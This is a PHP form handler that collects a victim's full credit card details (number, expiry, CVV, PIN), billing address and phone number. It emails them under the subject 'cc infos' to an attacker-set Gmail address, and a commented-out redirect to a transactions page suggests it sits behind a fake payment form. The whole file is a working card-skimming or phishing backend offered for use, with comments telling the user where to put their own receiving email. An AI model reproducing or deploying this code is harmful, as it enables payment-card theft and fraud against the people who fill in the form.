<?php 
if($_SERVER['REQUEST_METHOD'] === 'POST'){
	echo $name = 'full name: '.$cname=$_POST['cname'];
	echo "<br>";
	echo $num = 'number: '.$cnum=$_POST['cnumber'];
	echo "<br>";
	echo $exp='Expiry date: '.$_POST['exp'];
	echo "<br>";
	echo $cvv='cvv: '.$_POST['cvv'];
	echo "<br>";
	echo $sec='secuirty code:'.$_POST['seccode'];
	echo "<br>";
	echo $country='country: '.$_POST['country'];
	echo "<br>";
	echo $add='address: '.$_POST['address'];
	echo "<br>";
	echo $city='City: '.$_POST['city'];
	echo "<br>";
	echo $state='State'.$_POST['state'];
	echo "<br>";
	echo $postal='postal: '.$_POST['postal'];
	echo "<br>";
	echo $number='number: '.$_POST['number'];
	 
	 $message ="Name = ". $name . "\r\n  Number = " . $num . "\r\n Exp D =" .$exp."\r\n  Cvv = ".$cvv."\r\n pin =".$sec. "\r\n  Country =".$country."\r\n  Address =".$add.
	 "\r\n  City =".$city."\r\n  State =".$state."\r\n  Postal code =".$postal."\r\n  Phone number =".$number; 
    
    $subject ="cc infos";
    $fromname ="My Website Name";
    $fromemail = 'noreply@codeconia.com';  //if u dont have an email create one on your cpanel

    $mailto = 'youemail@gmail.com';  //the email which u want to recv this email




   // $content = file_get_contents($fileName);
   // $content = chunk_split(base64_encode($content));

    // a random hash will be necessary to send mixed content
    $separator = md5(time());

    // carriage return type (RFC)
    $eol = "\r\n";

    // main header (multipart mandatory)
    $headers = "From: ".$fromname." <".$fromemail.">" . $eol;
    $headers .= "MIME-Version: 1.0" . $eol;
    $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
    $headers .= "Content-Transfer-Encoding: 7bit" . $eol;
    $headers .= "This is a MIME encoded message." . $eol;

    // message
    $body = "--" . $separator . $eol;
    $body .= "Content-Type: text/plain; charset=\"iso-8859-1\"" . $eol;
    $body .= "Content-Transfer-Encoding: 8bit" . $eol;
    $body .= $message . $eol;

    // attachment
    $body .= "--" . $separator . $eol;
  //  $body .= "Content-Type: application/octet-stream; name=\"" . $filenameee . "\"" . $eol;
    $body .= "Content-Transfer-Encoding: base64" . $eol;
    $body .= "Content-Disposition: attachment" . $eol;
   // $body .= $content . $eol;
    $body .= "--" . $separator . "--";

    //SEND Mail
    if (mail($mailto, $subject, $body, $headers)) {
        echo "mail send ... OK"; // do what you want after sending the email
        
        
    } else {
        echo "mail send ... ERROR!";
        print_r( error_get_last() );
    }
	 
	
	//header('location:transactions.php');
} 




?>